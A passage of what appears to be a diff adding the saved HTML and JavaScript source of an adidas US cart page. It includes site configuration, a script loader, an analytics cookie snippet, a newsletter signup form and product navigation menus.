+app.resources["FORM_REGEXP_EMAIL"] = "^[^\\s@.]+(\\.[^\\s@.]+)*@[A-Za-z\\d]([\\w\\-]*([A-Za-z0-9]\\.[A-Za-z0-9])*)*([A-Za-z0-9]\\.[A-Za-z]{2,})$";
+
+app.resources["PROFILE_TERMSCONDITIONS"] = "Terms & Conditions";
+app.resources["PROFILE_WHATDOESTHATMEAN"] = "What does that mean?";
+app.resources["PROMO_CODE_VALIDATION_URL"] = "/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Submits";
+app.isPostamatEnabled = false;
+app.isCollectPointEnabled = false;
+app.isClickCollectEnabled= false;
+app.resources["MOBILE_PHONE_INVALID"] = "";
+app.resources["MOBILE_PHONE_PATTERN"] = "";
+app.resources["MI_SHOW_MIADIDAS_USP"] = true;
+/*Product Video*/
+app.resources["SCENE7_VIDEO_URL"] = "http://s7g10.scene7.com";
+/*coming soon*/
+app.resources["COMING_SOON_GENERAL_ERROR"] = "Sorry, sign up not available, please try again later";
+
+
+
+    app.resources["COUNTRY_RELY_ON_COOKIE"] = false;
+
+app.disableWorkaroundForTrusteOverlay = false
+app.constants.PERSONALIZATION_LOCALE = "";
+
+return app;
+}());app.define&&app.define('app.resources',function (){return app;});
+
+app.URLs.currentMobileUrl = "https://m.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show";
+(function (app, init) {
+var getWaitLoading = function (callback) {
+var loading = 0,
+loaded = 0;
+return function (script) {
+var tid;
+loading++;
+script.onload = script.onreadystatechange = function() {
+if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete") {
+if (tid) {
+clearTimeout(tid);
+}
+if (++loaded === loading) {
+callback();
+}
+}
+};
+tid = setTimeout(function () {
+script.onload = script.onreadystatechange = undefined;
+if (++loaded === loading) {
+callback();
+}
+}, 1000 * 10);
+};
+};
+app.firstDomReady = new jQuery.Deferred();
+jQuery(function () {
+app.firstDomReady.resolve();
+});
+if (app.isBuilded === true) {
+var scripts = app.bundlesRequired,
+head = document.getElementsByTagName("head")[0] || document.documentElement,
+loader = getWaitLoading(function(){
+init();
+});
+for (var i = 0; i < scripts.length; ++i) {
+var script = document.createElement('SCRIPT');
+script.setAttribute('type','text/javascript');
+script.async=true;
+script.src=scripts[i];
+loader(script);
+head.appendChild(script);
+}
+} else {
+init();
+}
+}(window.app, function () {
+
+
+
+
+
+app.require.config({
+baseUrl: "https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js",
+catchError: true,
+paths: {
+
+"avplayer": "//www.adidas.com/video/com/assets/js/aplayer",
+"ComponentMgr": "core/component/ComponentMgr",
+"Component": "core/component/Component",
+"PageContext": "utils/PageContext",
+"Analytics": "utils/Analytics",
+
+"ChatAgent": "https://adidas-group-gb.widget.custhelp.com/euf/rightnow/RightNow.Client",
+
+"jstorage": "vendor/jstorage.min"
+},
+waitSeconds: 0,
+map: {
+"*": {
+"styles": "vendor/require-css",
+"instance": "utils/require-instance",
+"text": "utils/require-text"
+}
+},
+shim: {
+},
+deps: [
+null,
+"jquery",
+"app.resources",
+"ComponentMgr",
+"PageContext",
+"Analytics",
+"utils/forms",
+"core/Application",
+"component/analytics/CertonaRecommendations",
+"vendor/modernizr.custom",
+"utils/social-sharing",
+"utils/jquery-ext",
+"utils/notification-broker"
+],
+callback: function (dependencies, jQuery, res, ComponentMgr, PageContext, Analytics, forms, Application, CertonaRecommendations, Modernizr, socialSharing) {
+app.firstDomReady.then(function () {
+ComponentMgr.selectorToComponent({
+'.showdialog': 'common/ShowDialog',
+'.showpopup': 'common/Popup',
+'.collapsible': 'common/Collapsible',
+'.dataswitch': 'common/Dataswitch',
+'.expandable-content': 'common/ExpandableBlocks',
+'.tooltip': 'common/Tooltip'
+
+});
+ComponentMgr.setRequiredComponents([
+"component/analytics/CertonaRecommendations",
+"component/common/header/HeaderRedesign",
+"component/common/header/SearchRedesign",
+"component/common/header/PrivacyLaw",
+"component/common/header/SignUpAndSave",
+"component/common/header/SlidePanel",
+"component/checkout/MiniCart"
+]);
+ComponentMgr.setDependencies(dependencies, "cart");
+ComponentMgr.initComponents();
+});
+// this is a hack
+Application.onLoad(function () {
+jQuery('#frameContainer').css('visibility', 'visible');
+});
+}
+});
+
+}));
+</script>
+
+
+<script type="text/javascript" src="/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/internal/jscript/dwac-14.8.js"></script>
+<script type="text/javascript">//<!--
+/* <![CDATA[ (head-cquotient.js) */
+var CQuotient = window.CQuotient = {};
+CQuotient.clientId = 'aaqx-adidas-US';
+CQuotient.activities = [];
+CQuotient.cqcid='';
+CQuotient.cquid='';
+CQuotient.initFromCookies = function () {
+  var ca = document.cookie.split(';');
+  for(var i=0;i < ca.length;i++) {
+    var c = ca[i];
+    while (c.charAt(0)==' ') c = c.substring(1,c.length);
+    if (c.indexOf('cqcid=') == 0) {
+      CQuotient.cqcid=c.substring('cqcid='.length,c.length);
+    } else if (c.indexOf('cquid=') == 0) {
+      CQuotient.cquid=c.substring('cquid='.length,c.length);
+      break;
+    }
+  }
+}
+CQuotient.getCQCookieId = function () {
+  if(window.CQuotient.cqcid == '')
+    window.CQuotient.initFromCookies();
+  return window.CQuotient.cqcid;
+};
+CQuotient.getCQUserId = function () {
+  if(window.CQuotient.cquid == '')
+    window.CQuotient.initFromCookies();
+  return window.CQuotient.cquid;
+};
+/* ]]> */
+// -->
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <script type="text/javascript" src="https://tags.tiqcdn.com/utag/adidas/adidasglobal/prod/utag.sync.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="adidas-US">
+<div id="container" class="pt_cart cart-empty">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class=" header-sticky-wrapper header-sticky-selfservice-wrapper-main" data-component="common/header/HeaderRedesign" data-sticky="true">
+
+    <div class=" header-selfservice-wrapper">
+      <div id="selfservice-header" class="header-redesign header-selfservice loading-resources " >
+        <div class="wrapper clearfix">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="selfservice-bg clearfix">
+<div class="account selfservice" >
+<ul class="selfservice-list">
+
+
+
+
+
+
+
+
+<!-- <li class="account-item"><a href="#">loyality</a></li>
+<li class="account-item"><a href="#">saved items</a></li>
+<li class="account-item"><a href="http://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Order-Track" manual_cm_sp="header-_-profilenotloggedin-_-orderstatus">Order tracker</a></li> -->
+
+
+
+
+<li class="selfservice-item-suas">
+
+
+
+<a class="selfservice-link-suas sign-up-and-save" href="#" title="Newsletter Signup">
+Newsletter Signup
+</a>
+
+
+
+</li>
+
+
+<li class="selfservice-item-login">
+<a class="selfservice-link-login" title="Login" href="https://www.adidas.com/us/myaccount">
+Login
+</a>
+</li>
+
+
+</ul>
+</div>
+</div>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="signupandsavecontent selfservice-signupandsavecontent"
+data-component="common/header/SignUpAndSave"
+data-customer-code="8151298043"
+
+data-custom1="Guest"
+
+
+>
+<div class="signupandsave_start">
+<div class="signup">
+
+
+
+
+
+
+
+
+<div class="callout-bars" data-contentslot="selfservice-promo-callout" data-component="content/CalloutBar">
+
+
+
+<div class="callout-bar  slot-content-contain clearfix " data-contentslot="selfservice-promo-callout" data-contentassetid="header-ssn-products" data-excludeforcustomize="true" tabindex="0">
+
+<img src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dwb5c087f6/logo/mail.png" width="88" height="88" class="base" />
+
+
+<div class="callout-bar-copy">
+
+
+
+
+<span class="readmore">Subscribe for email to stay up to date</span>
+
+<div class="callout-overlay-content" data-title="Subscribe for email to stay up to date">
+<span class="callout-bar-body">test for products</span>
+</div>
+
+
+</div>
+</div>
+
+
+
+<div class="callout-bar  slot-content-contain clearfix " data-contentslot="selfservice-promo-callout" data-contentassetid="header-ssn-free-delivery-over-150" data-excludeforcustomize="true" tabindex="0">
+
+<img src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dw4984bd3d/logo/percent.png" width="88" height="88" class="base" />
+
+
+<div class="callout-bar-copy">
+
+
+
+
+<span class="readmore">Save 15% on your next order</span>
+
+<div class="callout-overlay-content" data-title="Save 15% on your next order">
+<span class="callout-bar-body"><p>Title</p></span>
+</div>
+
+
+</div>
+</div>
+
+
+
+<div class="callout-bar last slot-content-contain clearfix " data-contentslot="selfservice-promo-callout" data-contentassetid="header-ssn-free-returns" data-excludeforcustomize="true" tabindex="0">
+
+<img src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dw539f50c4/logo/star.png" width="88" height="88" class="base" />
+
+
+<div class="callout-bar-copy">
+
+
+
+
+<span class="readmore">Exclusive offers &amp; promotions</span>
+
+<div class="callout-overlay-content" data-title="Exclusive offers &amp; promotions">
+<span class="callout-bar-body"><p>Not the right size or colour? No problem! Your order is picked up when &amp; where you like.</p>
+
+<p>&nbsp;</p>
+
+<p>Customised products are made just for you and therefore cannot be returned.</p>
+
+<p>&nbsp;</p>
+
+<p>Check out our <a href="https://www.adidas.com/us/help-topics-terms_and_conditions.html">Return Policy</a> for more details.</p></span>
+</div>
+
+
+</div>
+</div>
+
+</div>
+
+
+
+</div>
+<form id="signupandsaveform" class="signupandsaveform suppress validate fancyform signupandsaveform-full" action="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Newsletter-Submits" method="post" data-component="form/Form">
+<fieldset>
+<div class="general_error"></div>
+<div class="signupandsaveform-body clearfix">
+<div class="formfield email require">
+
+
+
+
+
+
+
+
+
+
+      <label for="dwfrm_profile_customer_email" class="">
+        Email
+
+      </label>
+
+
+
+
+
+      <div class="value">
+
+
+
+
+
+          <label class="label-off" for="dwfrm_profile_customer_email"></label> <input class="textinput required focusout required" id="dwfrm_profile_customer_email" type="text"  name="dwfrm_profile_customer_email"  value=""  maxlength="50" data-missing-error="Please enter a valid e-mail address"  data-parse-error="Please enter a valid e-mail address"  data-range-error="Value too long or too short"  required="required" />
+        <!-- display text area input field -->
+
+
+
+             <script type="text/json" data-component="common/HiddenJson">{label:"Email"}</script><!-- this MUST be immediately after the input/field tag. Hiden data to be attached to the input field (app.hiddenData in app.js -->
+
+
+
+
+      </div>
+
+
+
+
+               <span class="errormessage" style="display: none;"></span>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="caption">For first time subscribers only</div>
+
+</div>
+<div class="formfield require js_consents selfsevicesignup">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="birthday_wrapper clearfix">
+
+<div class="formfield birthday clearfix  mandatory" id="birthday-field-original">
+
+
+
+
+
+<label class="label-manual">
+
+Date of Birth
+
+<span class="label">&nbsp;*&nbsp;</span>
+
+</label>
+
+
+
+
+<!--  -->
+<div class="value value-select">
+
+
+
+<label class="label-off" for="dwfrm_profile_customer_birthday_dayofmonth">Day</label>
+<select class="required" name="dwfrm_profile_customer_birthday_dayofmonth" id="dwfrm_profile_customer_birthday_dayofmonth"  required="required"  data-missing-error="Date of birth is a required field" >
+<option class="first-option" value="">Day</option>
+
+
+<option  value="1">1</option>
+
+
+<option  value="2">2</option>
+
+
+<option  value="3">3</option>
+
+
+<option  value="4">4</option>
+
+
+<option  value="5">5</option>
+
+
+<option  value="6">6</option>
+
+
+<option  value="7">7</option>
+
+
+<option  value="8">8</option>
+
+
+<option  value="9">9</option>
+
+
+<option  value="10">10</option>
+
+
+<option  value="11">11</option>
+
+
+<option  value="12">12</option>
+
+
+<option  value="13">13</option>
+
+
+<option  value="14">14</option>
+
+
+<option  value="15">15</option>
+
+
+<option  value="16">16</option>
+
+
+<option  value="17">17</option>
+
+
+<option  value="18">18</option>
+
+
+<option  value="19">19</option>
+
+
+<option  value="20">20</option>
+
+
+<option  value="21">21</option>
+
+
+<option  value="22">22</option>
+
+
+<option  value="23">23</option>
+
+
+<option  value="24">24</option>
+
+
+<option  value="25">25</option>
+
+
+<option  value="26">26</option>
+
+
+<option  value="27">27</option>
+
+
+<option  value="28">28</option>
+
+
+<option  value="29">29</option>
+
+
+<option  value="30">30</option>
+
+
+<option  value="31">31</option>
+
+</select>
+
+
+
+
+<label class="label-off" for="dwfrm_profile_customer_birthday_month">Month</label>
+<select class="required" name="dwfrm_profile_customer_birthday_month" id="dwfrm_profile_customer_birthday_month"  required="required"  data-missing-error="Date of birth is a required field" >
+<option class="first-option" value="">Month</option>
+
+
+<option  value="0">1</option>
+
+
+<option  value="1">2</option>
+
+
+<option  value="2">3</option>
+
+
+<option  value="3">4</option>
+
+
+<option  value="4">5</option>
+
+
+<option  value="5">6</option>
+
+
+<option  value="6">7</option>
+
+
+<option  value="7">8</option>
+
+
+<option  value="8">9</option>
+
+
+<option  value="9">10</option>
+
+
+<option  value="10">11</option>
+
+
+<option  value="11">12</option>
+
+</select>
+
+
+
+
+<label class="label-off" for="dwfrm_profile_customer_birthday_year">Year</label>
+<select class="required" name="dwfrm_profile_customer_birthday_year" id="dwfrm_profile_customer_birthday_year"  required="required"  data-missing-error="Date of birth is a required field" >
+<option class="first-option" value="">Year</option>
+
+
+
+
+<option  value="2016">2016</option>
+
+
+
+<option  value="2015">2015</option>
+
+
+
+<option  value="2014">2014</option>
+
+
+
+<option  value="2013">2013</option>
+
+
+
+<option  value="2012">2012</option>
+
+
+
+<option  value="2011">2011</option>
+
+
+
+<option  value="2010">2010</option>
+
+
+
+<option  value="2009">2009</option>
+
+
+
+<option  value="2008">2008</option>
+
+
+
+<option  value="2007">2007</option>
+
+
+
+<option  value="2006">2006</option>
+
+
+
+<option  value="2005">2005</option>
+
+
+
+<option  value="2004">2004</option>
+
+
+
+<option  value="2003">2003</option>
+
+
+
+<option  value="2002">2002</option>
+
+
+
+<option  value="2001">2001</option>
+
+
+
+<option  value="2000">2000</option>
+
+
+
+<option  value="1999">1999</option>
+
+
+
+<option  value="1998">1998</option>
+
+
+
+<option  value="1997">1997</option>
+
+
+
+<option  value="1996">1996</option>
+
+
+
+<option  value="1995">1995</option>
+
+
+
+<option  value="1994">1994</option>
+
+
+
+<option  value="1993">1993</option>
+
+
+
+<option  value="1992">1992</option>
+
+
+
+<option  value="1991">1991</option>
+
+
+
+<option  value="1990">1990</option>
+
+
+
+<option  value="1989">1989</option>
+
+
+
+<option  value="1988">1988</option>
+
+
+
+<option  value="1987">1987</option>
+
+
+
+<option  value="1986">1986</option>
+
+
+
+<option  value="1985">1985</option>
+
+
+
+<option  value="1984">1984</option>
+
+
+
+<option  value="1983">1983</option>
+
+
+
+<option  value="1982">1982</option>
+
+
+
+<option  value="1981">1981</option>
+
+
+
+<option  value="1980">1980</option>
+
+
+
+<option  value="1979">1979</option>
+
+
+
+<option  value="1978">1978</option>
+
+
+
+<option  value="1977">1977</option>
+
+
+
+<option  value="1976">1976</option>
+
+
+
+<option  value="1975">1975</option>
+
+
+
+<option  value="1974">1974</option>
+
+
+
+<option  value="1973">1973</option>
+
+
+
+<option  value="1972">1972</option>
+
+
+
+<option  value="1971">1971</option>
+
+
+
+<option  value="1970">1970</option>
+
+
+
+<option  value="1969">1969</option>
+
+
+
+<option  value="1968">1968</option>
+
+
+
+<option  value="1967">1967</option>
+
+
+
+<option  value="1966">1966</option>
+
+
+
+<option  value="1965">1965</option>
+
+
+
+<option  value="1964">1964</option>
+
+
+
+<option  value="1963">1963</option>
+
+
+
+<option  value="1962">1962</option>
+
+
+
+<option  value="1961">1961</option>
+
+
+
+<option  value="1960">1960</option>
+
+
+
+<option  value="1959">1959</option>
+
+
+
+<option  value="1958">1958</option>
+
+
+
+<option  value="1957">1957</option>
+
+
+
+<option  value="1956">1956</option>
+
+
+
+<option  value="1955">1955</option>
+
+
+
+<option  value="1954">1954</option>
+
+
+
+<option  value="1953">1953</option>
+
+
+
+<option  value="1952">1952</option>
+
+
+
+<option  value="1951">1951</option>
+
+
+
+<option  value="1950">1950</option>
+
+
+
+<option  value="1949">1949</option>
+
+
+
+<option  value="1948">1948</option>
+
+
+
+<option  value="1947">1947</option>
+
+
+
+<option  value="1946">1946</option>
+
+
+
+<option  value="1945">1945</option>
+
+
+
+<option  value="1944">1944</option>
+
+
+
+<option  value="1943">1943</option>
+
+
+
+<option  value="1942">1942</option>
+
+
+
+<option  value="1941">1941</option>
+
+
+
+<option  value="1940">1940</option>
+
+
+
+<option  value="1939">1939</option>
+
+
+
+<option  value="1938">1938</option>
+
+
+
+<option  value="1937">1937</option>
+
+
+
+<option  value="1936">1936</option>
+
+
+
+<option  value="1935">1935</option>
+
+
+
+<option  value="1934">1934</option>
+
+
+
+<option  value="1933">1933</option>
+
+
+
+<option  value="1932">1932</option>
+
+
+
+<option  value="1931">1931</option>
+
+
+
+<option  value="1930">1930</option>
+
+
+
+<option  value="1929">1929</option>
+
+
+
+<option  value="1928">1928</option>
+
+
+
+<option  value="1927">1927</option>
+
+
+
+<option  value="1926">1926</option>
+
+
+
+<option  value="1925">1925</option>
+
+
+
+<option  value="1924">1924</option>
+
+
+
+<option  value="1923">1923</option>
+
+
+
+<option  value="1922">1922</option>
+
+
+
+<option  value="1921">1921</option>
+
+
+
+<option  value="1920">1920</option>
+
+
+
+<option  value="1919">1919</option>
+
+
+
+<option  value="1918">1918</option>
+
+
+
+<option  value="1917">1917</option>
+
+
+
+<option  value="1916">1916</option>
+
+</select>
+
+
+</div>
+
+
+
+<a class="asking_button" data-component="common/ShowDialog" title="">?</a>
+<div class="ui-dialog asking">
+  <a class="close cancel" title="Close">Close</a>
+  <p>adidas collects date of birth to comply with the Privacy Policy</p>
+  <button class="cancel button-primary bp-black light-back co-btn_primary btn_tertiary btn-regular-dark btn btn-dark" type="button" title="Close"><span>Close</span></button>
+</div>
+
+
+
+<span class="errormessage" style="display:none;"></span>
+
+
+
+<div class="errormsg-wrap">
+<span class="errormsg hidden">Date of birth is a required field</span>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="formfield gender">
+<fieldset>
+<div class="label"><legend>Gender</legend></div>
+<div class="ageconfirmatininp">
+<input type="hidden" name="gender" value="0"/>
+<input type="radio" name="dwfrm_profile_customer_gender" value="1" id="dwfrm_profile_customer_gender_1"></input>
+<label for="dwfrm_profile_customer_gender_1">Male</label>
+<input type="radio" name="dwfrm_profile_customer_gender" value="2" id="dwfrm_profile_customer_gender_2"></input>
+<label for="dwfrm_profile_customer_gender_2">Female</label>
+</div>
+</fieldset>
+</div>
+<div class="signin-actions">
+<a id="newsletterheadersubmitwomen" name="dwfrm_profile_subscribe" value="Submit" class="button-primary btn-regular-red bp-blue light-back co-btn_primary btn btn-red"><span>Sign Up</span></a>
+</div>
+
+</div>
+
+
+  <p class="legal-copy-content">Sign me up for adidas emails, featuring exclusive offers, latest product info, news about upcoming events, and more. See our <a href="/us/help-topics-privacy_policy.html" target=_blank>Privacy Policy</a> for details.</p>
+  <script type="text/template" id="legalcontentpopup">
+    <div class="signupandsavedialog"></div>
+  </script>
+
+
+</fieldset>
+</form>
+</div>
+<div class="signupandsave_complete">
+<h3 class="signupandsave_complete-title">Sign Up Complete</h3>
+<p class="signupandsave_complete-content">
+You will receive a confirmation to
+<span></span>
+</p>
+</div>
+<div class="loading_wrapper">
+<div class="loading">&nbsp;</div>
+</div>
+</div>
+
+      </div>
+    </div>
+
+  <div id="header" class="header-redesign loading-resources " >
+      <div class="wrapper clearfix">
+      <div class="column column-logo">
+         <a class="logo" href="http://www.adidas.com/us" alt="Home" title="Home">adidas</a>
+
+      </div>
+      <div class="column topcat-nav" data-component="content/ExternalLinks" data-linkscontext="header">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flyout navigation-gender-men">
+<div class="nav-button">
+<a class="top-cat-link" href="http://www.adidas.com/us/men">
+men
+</a>
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-gender-men" data-contentasset="navigation-gender-men">
+<div class="flyout-content-in">
+<div class="main-line">
+<div class="col-5">
+<div class="headline">featured</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/men-new_arrivals">New Arrivals</a></li>
+  <li><a href="http://www.adidas.com/us/men-best_sellers">Best Sellers</a></li>
+  <li><strong><a href="http://www.adidas.com/us/men-sale">Sale - New Markdowns Added</a></strong>
+                <li>&nbsp;</li>
+        <li><a href="http://www.adidas.com/us/men-zne">Z.N.E.</a></li>
+  <li><a href="http://www.adidas.com/us/men-iconics">Iconics</a></li>
+  <li><a href="http://www.adidas.com/us/men-tubular">Tubular</a></li>
+
+
+
+
+</ul>
+
+</div>
+<div class="col-5">
+<div class="headline">shoes</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/men-originals-shoes">Originals</a></li>
+  <li><a href="http://www.adidas.com/us/men-soccer-shoes">Soccer</a></li>
+  <li><a href="http://www.adidas.com/us/men-running-shoes">Running</a></li>
+  <li><a href="http://www.adidas.com/us/men-basketball-shoes">Basketball</a></li>
+  <li><a href="http://www.adidas.com/us/men-training-shoes">Training</a></li>
+  <li><a href="http://www.adidas.com/us/men-outdoor-shoes">Outdoor</a></li>
+      <li><a href="http://www.adidas.com/us/men-football-cleats">Football</a></li>
+  <li><a href="http://www.adidas.com/us/men-baseball1-shoes">Baseball</a></li>
+  <li><a href="http://www.adidas.com/us/men-tennis-shoes">Tennis</a></li>
+  <li><a href="http://www.adidas.com/us/men-slides">Sandals & Slides</a></li>
+  <li><a href="http://www.adidas.com/us/men-neo-shoes">NEO</a></li>
+  <li><a href="http://www.adidas.com/us/customize?prefn1=gender&amp;prefv1=Men">Customize with mi adidas</a></li>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="headline">Apparel</div>
+
+<ul>
+<li><a href="http://www.adidas.com/us/men-jackets">Jackets</a></li>
+<li><a href="http://www.adidas.com/us/men-hoodies">Hoodies & Sweatshirts</a></li>
+<li><a href="http://www.adidas.com/us/men-track_suits">Track Suits & Warm Ups</a></li>
+<li><a href="http://www.adidas.com/us/men-long_sleeve_tops">Long Sleeve Tops</a></li>
+<li><a href="http://www.adidas.com/us/men-short_sleeve_tops">Short Sleeve Tops</a></li>
+<li><a href="http://www.adidas.com/us/men-graphic_tees">Graphic Tees</a></li>
+<li><a href="http://www.adidas.com/us/men-sleeveless_tops">Sleeveless Tops</a></li>
+<li><a href="http://www.adidas.com/us/men-jerseys">Jerseys</a></li>
+<li><a href="http://www.adidas.com/us/men-pants">Pants</a></li>
+<li><a href="http://www.adidas.com/us/men-tights">Tights</a></li>
+<li><a href="http://www.adidas.com/us/men-shorts">Shorts</a></li>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="headline">accessories</div>
+<ul>
+<li><a href="http://www.adidas.com/us/men-bags">Bags</a></li>
+<li><a href="http://www.adidas.com/us/men-balls">Balls</a></li>
+<li><a href="http://www.adidas.com/us/men-sunglasses">Sunglasses</a></li>
+<li><a href="http://www.adidas.com/us/men-watches">Watches</a></li>
+<li><a href="http://www.adidas.com/us/men-gloves">Gloves</a></li>
+<li><a href="http://www.adidas.com/us/men-hats">Hats</a></li>
+<li><a href="http://www.adidas.com/us/men-socks">Socks</a></li>
+<li><a href="http://www.adidas.com/us/men-underwear">Underwear</a></li>
+<li><a href="http://www.adidas.com/us/men-scarves">Scarves</a></li>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="headline">sports</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/men-soccer">Soccer</a></li>
+  <li><a href="http://www.adidas.com/us/men-running">Running</a></li>
+  <li><a href="http://www.adidas.com/us/men-basketball">Basketball</a></li>
+  <li><a href="http://www.adidas.com/us/men-training">Training</a></li>
+  <li><a href="http://www.adidas.com/us/men-football">Football</a></li>
+  <li><a href="http://www.adidas.com/us/men-baseball1">Baseball</a></li>
+  <li><a href="http://www.adidas.com/us/men-tennis">Tennis</a></li>
+  <li><a href="http://www.adidas.com/us/men-outdoor">Outdoor</a></li>
+        <li><a href="http://www.adidas.com/us/men-weightlifting">Weightlifting</a></li>
+  <li><a href="http://www.adidas.com/us/men-skateboarding1">Skateboarding</a></li>
+  <li><a href="http://www.adidas.com/us/snowboarding">Snowboarding</a></li>
+  <li><a href="http://www.adidas.com/us/men-hockey">Hockey</a></li>
+  <li><a href="http://www.adidas.com/us/men-lacrosse">Lacrosse</a></li>
+<li><a href="http://www.adidas.com/us/men-volleyball">Volleyball</a></li>
+</ul>
+</div>
+
+
+</div>
+
+<div class="bottom-line">
+<!-- <div class="col-5">&nbsp;</div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/men-shoes"><strong>Shop all Men's Shoes</strong></a></div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/men-apparel"><strong>Shop all Men's Apparel</strong></a></div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/men-accessories"><strong>Shop all Men's Accesories</strong></a></div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/men"><strong>Shop all Men's</strong></a></div> -->
+</div>
+
+
+</div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+<div class="flyout navigation-gender-women">
+<div class="nav-button">
+<a class="top-cat-link" href="http://www.adidas.com/us/women">
+women
+</a>
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-gender-women" data-contentasset="navigation-gender-women">
+<div class="flyout-content-in">
+<div class="main-line">
+
+<div class="col-5">
+<div class="headline">featured</div>
+<ul>
+<li><a href="http://www.adidas.com/us/women-new_arrivals">New Arrivals</a></li>
+<li><a href="http://www.adidas.com/us/women-best_sellers">Best Sellers</a></li>
+<li><strong><a href="http://www.adidas.com/us/women-sale">Sale - New Markdowns Added</a></strong></li>
+                <li>&nbsp;</li>
+<li><a href="http://www.adidas.com/us/women-zne">Z.N.E.</a></li>
+<li><a href="http://www.adidas.com/us/pureboost_x?grid=true">Pureboost X</a></li>
+<li><a href="http://www.adidas.com/us/women-iconics">Iconics</a></li>
+<li><a href="http://www.adidas.com/us/rita_ora">Rita Ora</a></li>
+
+</ul>
+
+
+</div>
+
+<div class="col-5">
+<div class="headline">shoes</div>
+<ul>
+<li><a href="http://www.adidas.com/us/women-originals-shoes">Originals</a></li>
+<li><a href="http://www.adidas.com/us/women-soccer-shoes">Soccer</a></li>
+<li><a href="http://www.adidas.com/us/women-running-shoes">Running</a></li>
+<li><a href="http://www.adidas.com/us/women-training-shoes">Training</a></li>
+<li><a href="http://www.adidas.com/us/women-basketball-shoes">Basketball</a></li>
+<li><a href="http://www.adidas.com/us/women-tennis-shoes">Tennis</a></li>
+<li><a href="http://www.adidas.com/us/women-outdoor-shoes">Outdoor</a></li>
+<li><a href="http://www.adidas.com/us/women-softball-shoes">Softball</a></li>
+<li><a href="http://www.adidas.com/us/women-slides">Sandals & Slides</a></li>
+<li><a href="http://www.adidas.com/us/women-neo-shoes">NEO</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=gender&prefv1=Women">Customize with mi adidas</a></li>
+</ul>
+</div>
+
+
+<div class="col-5">
+<div class="headline">Apparel</div>
+<ul>
+<li><a href="http://www.adidas.com/us/women-jackets">Jackets</a></li>
+<li><a href="http://www.adidas.com/us/women-hoodies">Hoodies & Sweatshirts</a></li>
+<li><a href="http://www.adidas.com/us/women-track_suits">Track Suits & Warm Ups</a></li>
+<li><a href="http://www.adidas.com/us/women-long_sleeve_tops">Long Sleeve Tops</a></li>
+<li><a href="http://www.adidas.com/us/women-short_sleeve_tops%7Cgraphic_tees">Short Sleeve Tops</a></li>
+<li><a href="http://www.adidas.com/us/women-sleeveless_tops">Sleeveless Tops</a></li>
+<li><a href="http://www.adidas.com/us/women-bras">Sports Bras</a></li>
+<li><a href="http://www.adidas.com/us/women-pants">Pants</a></li>
+<li><a href="http://www.adidas.com/us/women-tights">Tights</a></li>
+<li><a href="http://www.adidas.com/us/women-shorts">Shorts</a></li>
+</ul>
+</div>
+
+
+<div class="col-5">
+<div class="headline">Accessories</div>
+<ul>
+<li><a href="http://www.adidas.com/us/women-bags">Bags</a></li>
+<li><a href="http://www.adidas.com/us/women-balls">Balls</a></li>
+<li><a href="http://www.adidas.com/us/women-sunglasses">Sunglasses</a></li>
+<li><a href="http://www.adidas.com/us/women-watches">Watches</a></li>
+<li><a href="http://www.adidas.com/us/women-gloves">Gloves</a></li>
+<li><a href="http://www.adidas.com/us/women-hats">Hats</a></li>
+<li><a href="http://www.adidas.com/us/women-socks">Socks</a></li>
+<li><a href="http://www.adidas.com/us/women-underwear">Underwear</a></li>
+<li><a href="http://www.adidas.com/us/women-scarves">Scarves</a></li></ul>
+</div>
+
+
+<div class="col-5">
+<div class="headline">sports</div>
+<ul>
+<li><a href="http://www.adidas.com/us/women-soccer">Soccer</a></li>
+<li><a href="http://www.adidas.com/us/women-running">Running</a></li>
+<li><a href="http://www.adidas.com/us/women-training">Training</a></li>
